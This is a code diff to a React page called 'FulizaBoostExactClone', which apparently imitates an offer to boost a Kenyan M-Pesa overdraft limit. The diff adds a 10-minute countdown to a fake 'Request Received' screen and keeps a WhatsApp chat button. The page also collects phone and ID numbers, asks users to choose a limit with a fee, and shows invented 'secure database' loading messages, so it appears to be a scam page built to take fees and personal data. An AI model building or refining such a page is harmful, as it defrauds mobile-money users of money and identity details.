@@ -1,5 +1,5 @@
 'use client';
-// src/app/page.tsx - Complete Code with "Request Received" Success Screen
+// src/app/page.tsx - Final Version with 10-Minute Countdown
 
 import React, { useState, useEffect } from 'react';
 
@@ -35,6 +35,9 @@ export default function FulizaBoostExactClone() {
   const [selectedLimit, setSelectedLimit] = useState<{ amount: number; fee: number } | null>(null);
   const [idNumber, setIdNumber] = useState('');
 
+  // Countdown state (10 minutes = 600 seconds)
+  const [countdown, setCountdown] = useState(600);
+
   const loadingMessages = [
     "Connecting...",
     "Accessing secure databases...",
@@ -49,6 +52,24 @@ export default function FulizaBoostExactClone() {
     }, 2800);
     return () => clearInterval(interval);
   }, []);
+
+  // Countdown timer when success modal is open
+  useEffect(() => {
+    let timer: NodeJS.Timeout;
+    if (showSuccessModal && countdown > 0) {
+      timer = setInterval(() => {
+        setCountdown((prev) => prev - 1);
+      }, 1000);
+    }
+    return () => clearInterval(timer);
+  }, [showSuccessModal, countdown]);
+
+  // Format countdown as MM:SS
+  const formatCountdown = () => {
+    const minutes = Math.floor(countdown / 60);
+    const seconds = countdown % 60;
+    return `${minutes}:${seconds.toString().padStart(2, '0')}`;
+  };
 
   const handleCheckEligibility = () => {
     if (!phoneNumber.trim()) {
@@ -89,23 +110,19 @@ export default function FulizaBoostExactClone() {
 
   const closeProcessingModal = () => {
     setShowProcessingModal(false);
-    setShowSuccessModal(true);   // Show the new Request Received screen
+    setShowSuccessModal(true);
+    setCountdown(600); // Reset countdown to 10:00 when opening success modal
   };
 
   const closeSuccessModal = () => {
     setShowSuccessModal(false);
     setStep('final');
+    setCountdown(600); // Reset for next time
   };
 
   const closeSecureModal = () => {
     setShowSecureModal(false);
   };
-
-  // Current time for the success screen (like 9:48 in screenshot)
-  const currentTime = new Date().toLocaleTimeString([], { 
-    hour: '2-digit', 
-    minute: '2-digit' 
-  });
 
   return (
     <div className="min-h-screen bg-gradient-to-br from-emerald-50 to-white flex items-center justify-center px-4 py-8 font-sans">
@@ -119,7 +136,7 @@ export default function FulizaBoostExactClone() {
 
         <div className="bg-white rounded-3xl shadow-2xl overflow-hidden min-h-[600px]">
 
-          {/* Input, Loading, Congrats, Select, Final screens remain the same as before */}
+          {/* Input Screen */}
           {step === 'input' && (
             <>
               <div className="pt-10 pb-6 flex flex-col items-center">
@@ -162,6 +179,7 @@ export default function FulizaBoostExactClone() {
             </>
           )}
 
+          {/* Loading Screen */}
           {step === 'loading' && (
             <div className="fixed inset-0 bg-black/70 flex items-center justify-center z-50">
               <div className="bg-white rounded-3xl p-12 w-[320px] text-center shadow-2xl">
@@ -172,6 +190,7 @@ export default function FulizaBoostExactClone() {
             </div>
           )}
 
+          {/* Congratulations Screen */}
           {step === 'congrats' && (
             <div className="px-8 py-12 text-center">
               <div className="mx-auto w-20 h-20 bg-emerald-600 rounded-full flex items-center justify-center mb-6">
@@ -191,6 +210,7 @@ export default function FulizaBoostExactClone() {
             </div>
           )}
 
+          {/* Select Limit Screen */}
           {step === 'select' && (
             <div className="px-4 py-6">
               <div className="text-center mb-6">
@@ -234,6 +254,7 @@ export default function FulizaBoostExactClone() {
             </div>
           )}
 
+          {/* Final Ksh 0 Screen */}
           {step === 'final' && (
             <div className="px-8 py-16 text-center">
               <h2 className="text-3xl font-bold text-emerald-700">Limit will be boosted to</h2>
@@ -324,7 +345,7 @@ export default function FulizaBoostExactClone() {
         </div>
       )}
 
-      {/* NEW: REQUEST RECEIVED SUCCESS SCREEN */}
+      {/* REQUEST RECEIVED SUCCESS SCREEN WITH 10-MINUTE COUNTDOWN */}
       {showSuccessModal && selectedLimit && (
         <div className="fixed inset-0 bg-black/70 flex items-center justify-center z-[70] px-4">
           <div className="bg-white rounded-3xl w-full max-w-[380px] overflow-hidden shadow-2xl">
@@ -345,9 +366,11 @@ export default function FulizaBoostExactClone() {
               <h3 className="text-2xl font-semibold text-gray-900">Request Received</h3>
               <p className="text-gray-600 mt-1">Updating records. Please wait.</p>
 
-              {/* Time Display */}
-              <div className="mt-8 bg-gray-100 rounded-2xl py-3 px-8 inline-block text-xl font-medium text-gray-700">
-                {currentTime}
+              {/* 10-Minute Countdown */}
+              <div className="mt-8 bg-gray-100 rounded-2xl py-4 px-10 inline-block">
+                <span className="text-4xl font-mono font-semibold text-gray-800">
+                  {formatCountdown()}
+                </span>
               </div>
             </div>
 
@@ -356,7 +379,7 @@ export default function FulizaBoostExactClone() {
               <button
                 className="w-full bg-emerald-600 hover:bg-emerald-700 py-4 rounded-2xl text-white font-semibold flex items-center justify-center gap-2"
               >
-                <span>💬</span> Chat with zuri on WhatsApp
+                <span>💬</span> Chat on WhatsApp
               </button>
 
               <button
